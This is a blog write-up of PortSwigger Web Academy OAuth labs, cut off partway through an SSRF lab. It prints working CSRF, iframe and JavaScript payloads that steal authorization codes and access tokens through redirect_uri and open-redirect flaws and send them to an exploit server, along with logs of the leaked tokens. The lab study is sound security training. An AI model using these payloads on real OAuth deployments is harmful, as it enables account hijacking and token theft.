<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(Portswigger/WebAcademy) - OAuth 2.0 authentication vulnerabilities" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="Intro This post/writeup is all about the JWT Token Vulnerabilities." /><meta property="og:description" content="Intro This post/writeup is all about the JWT Token Vulnerabilities." /><link rel="canonical" href="https://an9k0r.github.io/posts/oauth/" /><meta property="og:url" content="https://an9k0r.github.io/posts/oauth/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-01-15T08:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(Portswigger/WebAcademy) - OAuth 2.0 authentication vulnerabilities" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"Intro This post/writeup is all about the JWT Token Vulnerabilities.","headline":"(Portswigger/WebAcademy) - OAuth 2.0 authentication vulnerabilities","dateModified":"2023-03-24T21:19:22+01:00","url":"https://an9k0r.github.io/posts/oauth/","datePublished":"2023-01-15T08:00:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/oauth/"},"@context":"https://schema.org"}</script><title>(Portswigger/WebAcademy) - OAuth 2.0 authentication vulnerabilities | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(Portswigger/WebAcademy) - OAuth 2.0 authentication vulnerabilities</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>(Portswigger/WebAcademy) - OAuth 2.0 authentication vulnerabilities</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2023-01-15 08:00:00 +0100" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 15, 2023, 8:00 AM +0100" >Jan 15</em> </span> <span> Updated <em class="timeago" date="2023-03-24 21:19:22 +0100 " data-toggle="tooltip" data-placement="bottom" title="Fri, Mar 24, 2023, 9:19 PM +0100" >Mar 24</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1686 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><h1 id="intro">Intro</h1><p>This post/writeup is all about the JWT Token Vulnerabilities.</p><p>I’ll be using primarily <a href="https://portswigger.net/web-security/oauth">Portswigger Web Academy</a> Labs, but i do intent do throw other labs and writeups here as well.</p><p>To learn more on the topic, please visit the article linked above at Portswigger’s or this ones about <a href="https://portswigger.net/web-security/oauth/grant-types">grant types</a></p><p>There are two grant types which are:</p><ul><li>Authorization code grant type, which consists of<ul><li>Authorization Request (Client App =&gt; Browser =&gt; OAuth Service API)<li>User login and consent which is sent from OAuth Service API to browser. This may be single click if Session with OAuth Provider is still valid, however consent will always be present.<li>Authorization code grant will be sent from OAuth Service API to the Client App, and browser will be redirected to <code class="language-plaintext highlighter-rouge">/callback</code><li>SERVER2SERVER communcation continues between Client App and OAuth Service API. Authorization code will be exchanged for <strong>Access Token</strong> (POST Request to <code class="language-plaintext highlighter-rouge">/token</code> endpoint)<li>Access token is (or not) granted from OAuth Service to Client App<li>Client API fetches the user data that user has consented to.<li>User is logged in.</ul><li>Implicit grant type<ul><li>Is the same thing, just there is no SERVER2SERVER communication and this grant type is much less secure.</ul></ul><p>Make sure to check the <a href="https://portswigger.net/web-security/oauth/grant-types">grant types</a> article at Portswigger’s.</p><h2 id="toc">TOC<a href="#toc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h1 id="authentication-bypass-via-oauth-implicit-flow">Authentication bypass via OAuth implicit flow</h1><blockquote><p>This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users’ accounts without knowing their password.</p><p>To solve the lab, log in to Carlos’s account. His email address is <code class="language-plaintext highlighter-rouge">carlos@carlos-montoya.net</code>.</p><p>You can log in with your own social media account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code>.</p></blockquote><p>First let’s login using provided credentials <code class="language-plaintext highlighter-rouge">wiener:peter</code> <img data-src="/assets/images/f6b1f7fea4a3720c971494126c73e36e1c425c50a82ee53814715c91385c8d98.png" alt="picture 2" data-proofer-ignore></p><p>Now several requests should’ve been sent:</p><p><img data-src="/assets/images/b1415168129e99ee624bcd60b0685efd9c1e3451497322fab449944701017024.png" alt="picture 3" data-proofer-ignore></p><p>What happens if we change Email in <code class="language-plaintext highlighter-rouge">/authenticate</code> using Burp Repeater.</p><p><img data-src="/assets/images/7447f199e9696da3361c3ca1a64870ec5f9267f945f58021bac916c2d95b3d82.png" alt="picture 4" data-proofer-ignore></p><p>We’ll get redirected and lab would’ve been solved. Just like that, we’ve bypassed authentication for <code class="language-plaintext highlighter-rouge">carlos@carlos-montoya.net</code>.</p><p>Lab has been solved <img data-src="/assets/images/9f21ab421305e404ee7cf9abb5947b66e763cef43b94760d507633a4b9832215.png" alt="picture 1" data-proofer-ignore></p><h1 id="forced-oauth-profile-linking">Forced OAuth profile linking</h1><blockquote><p>This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users’ accounts.</p><p>To solve the lab, use a CSRF attack to attach your own social media profile to the admin user’s account on the blog website, then access the admin panel and delete Carlos.</p><p>The admin user will open anything you send from the exploit server and they always have an active session on the blog website.</p><p>You can log in to your own accounts using the following credentials:</p><ul><li>Blog website account: <code class="language-plaintext highlighter-rouge">wiener:peter</code><li>Social media profile: <code class="language-plaintext highlighter-rouge">peter.wiener:hotdog</code></ul></blockquote><p>If we login using <code class="language-plaintext highlighter-rouge">wiener:peter</code> and we’ll see that we have <code class="language-plaintext highlighter-rouge">Attach a social profile</code> option.</p><p><img data-src="/assets/images/f6a21aafead1e5740834a522dabf786f7dff0b516a70b08190cd5ef19ed03105.png" alt="picture 5" data-proofer-ignore></p><p>If we choose that and enter <code class="language-plaintext highlighter-rouge">peter.wiener:hotdog</code> credentials we’ll get to request from the OAuth Server to confirm the scope.</p><p><img data-src="/assets/images/033c4ccc94569f528ef539ba37c920570b4c70435da205e621adf725c231f31e.png" alt="picture 6" data-proofer-ignore></p><p>If we confirm the scope, we’ll see the message that account has been linked with social media account.</p><p><img data-src="/assets/images/e8f6f76d6743287cdddb4ad9a9fcac1ff54f3366cee138a41233b37ade2f6002.png" alt="picture 7" data-proofer-ignore></p><p>If we now log out …</p><p><img data-src="/assets/images/781f4577793bdadb50a8ce7b1f2535d18a81c39aa5f29b1421be05c3d7ff721b.png" alt="picture 8" data-proofer-ignore></p><p>And go into <code class="language-plaintext highlighter-rouge">My Account &gt; Log in using Social Media Account</code> we’ll get logged in instantly.</p><p><img data-src="/assets/images/3a52afca9f1f1e996f3ae879a57a08629443bd340618c2398edc96fd424b2899.png" alt="picture 9" data-proofer-ignore></p><p>Exploit. PS, there is no CSRF tokens! Delivery via button <code class="language-plaintext highlighter-rouge">Deliver exploit to victim</code> where victim will open everything.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;img src="https://0a3300cf04a076a5c311b02e001f0080.web-security-academy.net/oauth-linking?code=CPbBtSiz6i_IziPL9VOJuw-OaQPYYz4FWeU3CwYPW4e"&gt;&lt;/img&gt;
</pre></table></code></div></div><p><img data-src="/assets/images/58eb524c5ebed8414ad505ac9f63c03ecab43dd194b540e8b87c2790e5ae1f91.png" alt="picture 10" data-proofer-ignore></p><p>When victim opens the link above, its social account gets linked with <code class="language-plaintext highlighter-rouge">wiener</code>.</p><p>All we have to do is <code class="language-plaintext highlighter-rouge">login using social media account</code> and we should see <code class="language-plaintext highlighter-rouge">Admin Panel</code> where we can delete <code class="language-plaintext highlighter-rouge">carlos</code> and complete the lab.</p><p><img data-src="/assets/images/e80e40a9bb11e4e3a776372aff7a45b9c3611eb8938c4f1bfde78bbb26a47fdd.png" alt="picture 11" data-proofer-ignore></p><p>As already mentioned in the lab description itself. The reason why, we were admin account got mapped with our user was lack of using <code class="language-plaintext highlighter-rouge">state</code> parameter in the auth request.</p><h1 id="oauth-account-hijacking-via-redirect_uri">OAuth account hijacking via redirect_uri</h1><blockquote><p>This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users’ accounts.</p><p>To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos.</p><p>The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.</p><p>You can log in with your own social media account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code>.</p></blockquote><p>When we click on <code class="language-plaintext highlighter-rouge">My Account</code>, we’ll automatically get redirected to Sign in</p><p><img data-src="/assets/images/d3360a01e7df81924c2b360e84f865af06fe2c6caf98b42d0c50cb28a6cc3e03.png" alt="picture 12" data-proofer-ignore></p><p>Let’s signin using provided credentials <code class="language-plaintext highlighter-rouge">wiener:peter</code>. Confirm the scope and we should be logged in afterwards.</p><p><img data-src="/assets/images/050e20230a5c8bc06fba2548e2c18f66de8a69158ad0d1ececc17d20c23b86d7.png" alt="picture 13" data-proofer-ignore></p><p>If i log out and change the <code class="language-plaintext highlighter-rouge">redirect_uri</code> with the one with <code class="language-plaintext highlighter-rouge">exploit-...</code> then the WebApp will redirect me there and i’ll leak the token</p><p><img data-src="/assets/images/3d62ad6b6ff0e675ed008d93138620bec297ac7be533a36be7f45c8d7c43838f.png" alt="picture 14" data-proofer-ignore></p><p>Check the Access Logs</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>87.181.171.142  2023-03-10 18:05:22 +0000 "GET /oauth-callback?code=lH6JjG4-zM9WU7H71rnTcoO21Y_jDGE-PYHIwHEDDB2 HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
</pre></table></code></div></div><p><img data-src="/assets/images/83740441906303d23940571c2a41fcc3175dc943381ab2e0f3cb6511da639ecd.png" alt="picture 15" data-proofer-ignore></p><p>Deliver the payload to victim</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"https://oauth-0a370096040dd78fc2a9109f024800c8.oauth-server.net/auth?client_id=t01m58r8e75mz8c5brko5&amp;redirect_uri=https://exploit-0a0600a904e5d707c20911290126001b.exploit-server.net&amp;response_type=code&amp;scope=openid%20profile%20email"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</pre></table></code></div></div><p>If we now go and check access logs, we should find few entries including the code that got leaked.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>10.0.4.215      2023-03-10 18:47:20 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"

10.0.4.215      2023-03-10 18:47:21 +0000 "GET /?code=fgMsBD1PAaJJ30MKNZddEr6fKYTt2Sombr-haM1Ocss HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"

10.0.4.215      2023-03-10 18:47:21 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"

</pre></table></code></div></div><p>Now log out, log in and intercept at <code class="language-plaintext highlighter-rouge">oauth-callback</code> and exchange the <code class="language-plaintext highlighter-rouge">access token</code>.</p><p><img data-src="/assets/images/ba11d4bf3f5b981216f908e24f01c4566b05dec8aad96fc32f928a608b8c0c9c.png" alt="picture 16" data-proofer-ignore></p><p>Admin panel should now be seen. We can delete <code class="language-plaintext highlighter-rouge">carlos</code> and finish the lab.</p><p><img data-src="/assets/images/40830a660823f9fe71909632ea8da3eddacadc569b05a07bf063e10b5765330e.png" alt="picture 17" data-proofer-ignore></p><p>More secure authorization servers will require a <code class="language-plaintext highlighter-rouge">redirect_uri</code> parameter to be sent when exchanging the <code class="language-plaintext highlighter-rouge">authorization code</code> as well. The server can then check whether this matches the one it received in the initial authorization request and reject the exchange if not. As this happens in server-to-server requests via a secure back-channel, the attacker is not able to control this second redirect_uri parameter. You can read more about that in at <a href="https://portswigger.net/web-security/oauth">portswigger’s</a>.</p><h1 id="stealing-oauth-access-tokens-via-an-open-redirect">Stealing OAuth access tokens via an open redirect</h1><blockquote><p>This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.</p><p>To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user’s account. Use the access token to obtain the admin’s API key and submit the solution using the button provided in the lab banner.</p><p><strong>Note</strong></p><p>!!! You cannot access the admin’s API key by simply logging in to their account on the client application</p><p>The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.</p><p>You can log in via your own social media account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code></p></blockquote><p>In order to find a open redirect we obviously first need to search for it. When going into blog posts and click on <code class="language-plaintext highlighter-rouge">Next Post</code>, following request will fire</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/post/next?path=/post?postId=2
</pre></table></code></div></div><p>If we exchange the <code class="language-plaintext highlighter-rouge">/path</code>, we’ll get redirected there.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://0a040096041a20bac0f1db9d003e00c5.web-security-academy.net/auth?client_id=uyi3jd4v3nvvxrtr6ta3r&amp;redirect_uri=https://0a040096041a20bac0f1db9d003e00c5.web-security-academy.net/post/next?path=https://exploit-0a2b007004ba20c6c013da57015e0004.exploit-server.net/&amp;response_type=token&amp;nonce=-1323844043&amp;scope=openid%20profile%20email
</pre></table></code></div></div><p>What’s now a bit tricky is to server a payload which will respond accordingly. We now need to create an exploit that first forces the victim to visit oue malicious URL and then executes the script we just tested to steal their access token.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://oauth-0aa10074040f209dc07dd97c029700e0.oauth-server.net/auth?client_id=uyi3jd4v3nvvxrtr6ta3r&amp;redirect_uri=https://0a040096041a20bac0f1db9d003e00c5.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a2b007004ba20c6c013da57015e0004.exploit-server.net/exploit&amp;response_type=token&amp;nonce=-1343228737&amp;scope=openid%20profile%20email</span><span class="dl">"</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">/?</span><span class="dl">'</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Access log should be found:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>10.0.4.32       2023-03-10 20:02:04 +0000 "GET /exploit HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"

10.0.4.32       2023-03-10 20:02:04 +0000 "GET /?access_token=CnvFuSgC49GVghnWkWEOIHoUbTLnz7qGuuDBDsfaAf_&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"

10.0.4.32       2023-03-10 20:02:04 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"

</pre></table></code></div></div><p>We can request session token</p><p><img data-src="/assets/images/0334d7528f13970341c7da45d142e225357f8de8b3350469283e91dedf2b1086.png" alt="picture 18" data-proofer-ignore></p><p>To find the apikey, we’ll need to check the <code class="language-plaintext highlighter-rouge">/me</code> endpoint.</p><p><img data-src="/assets/images/5ce3b36a62a92377ddc17fed2b2d88f628adb0c6face0f5c5f68d5599d518579.png" alt="picture 19" data-proofer-ignore></p><p>This Lab is very similar to previous one, however we had to find a way to redirect <code class="language-plaintext highlighter-rouge">access token</code> using <code class="language-plaintext highlighter-rouge">directory traversal</code> vulnerability on open redirect.</p><h1 id="ssrf-via-openid-dynamic-client-registration">SSRF via OpenID dynamic client registration</h1><blockquote><p>This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.</p><p>To solve the lab, craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider’s cloud environment.</p><p>You can log in to your own account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code></p><p><strong>Note</strong></p><p>!!! To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator’s default public server.</p></blockquote><p>Login the provided credentials and check the openid configuration</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/.well-known/openid-configuration

{"authorization_endpoint":"https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/auth","claims_parameter_supported":false,"claims_supported":["sub","name","email","email_verified","sid","auth_time","iss"],"code_challenge_methods_supported":["S256"],"end_session_endpoint":"https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/session/end","grant_types_supported":["authorization_code","refresh_token"],"id_token_signing_alg_values_supported":["HS256","ES256","EdDSA","PS256","RS256"],"issuer":"https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net","jwks_uri":"https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/jwks","registration_endpoint":"https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/reg","response_modes_supported":["form_post","fragment","query"],"response_types_supported":["code"],"scopes_supported":["openid","offline_access","profile","email"],"subject_types_supported":["public"],"token_endpoint_auth_methods_supported":["none","client_secret_basic","client_secret_jwt","client_secret_post","private_key_jwt"],"token_endpoint_auth_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"token_endpoint":"https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/token","request_object_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"request_parameter_supported":false,"request_uri_parameter_supported":true,"require_request_uri_registration":true,"userinfo_endpoint":"https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/me","userinfo_signing_alg_values_supported":["HS256","ES256","EdDSA","PS256","RS256"],"introspection_endpoint":"https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/token/introspection","introspection_endpoint_auth_methods_supported":["none","client_secret_basic","client_secret_jwt","client_secret_post","private_key_jwt"],"introspection_endpoint_auth_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"revocation_endpoint":"https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/token/revocation","revocation_endpoint_auth_methods_supported":["none","client_secret_basic","client_secret_jwt","client_secret_pos